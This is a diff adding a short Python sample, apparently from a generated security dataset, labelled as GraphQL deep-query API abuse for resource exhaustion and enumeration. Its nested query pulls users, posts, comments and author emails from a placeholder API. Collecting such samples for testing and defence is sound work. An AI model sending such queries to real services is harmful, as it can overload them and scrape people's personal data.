@@ -1,0 +1,28 @@
+# Resource Exhaustion - API Abuse Sample 9
+# Created: 2026-03-30T22:24:11.730212
+# Type: API Rate Limit Bypass / Enumeration / GraphQL Deep Query
+
+# API GraphQL Deep Query - Sample 3
+query = '''
+{
+  users {
+    id
+    name
+    email
+    posts {
+      id
+      title
+      content
+      comments {
+        id
+        text
+        author {
+          name
+          email
+        }
+      }
+    }
+  }
+}
+'''
+response = requests.post("https://api.example.com/graphql", json={"query": query})
